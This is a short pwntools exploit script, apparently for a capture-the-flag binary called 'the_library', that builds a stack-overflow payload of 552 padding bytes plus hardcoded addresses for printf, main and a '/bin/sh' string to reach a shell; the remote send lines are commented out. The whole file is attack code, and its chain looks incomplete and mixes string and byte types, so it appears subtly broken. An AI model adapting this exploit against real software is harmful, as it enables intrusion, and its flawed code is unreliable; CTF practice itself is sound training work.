from pwn import *

DEBUG = True

# if DEBUG:
#     r = process("./the_library")
#     gdb.attach(r)
# else:
#     r = remote("challenge.ctf.games", 31125)

sys_lib = 0x7ffff7a31550
bin_sh = 0x7ffff7b95e1a
printf_plt = 0x401120
main = 0x00000000004012a9
payload = "1"*552+p64(printf_plt)+p64(main)+p64(bin_sh)

print(payload)

# r.sendline(payload)
# r.interactive()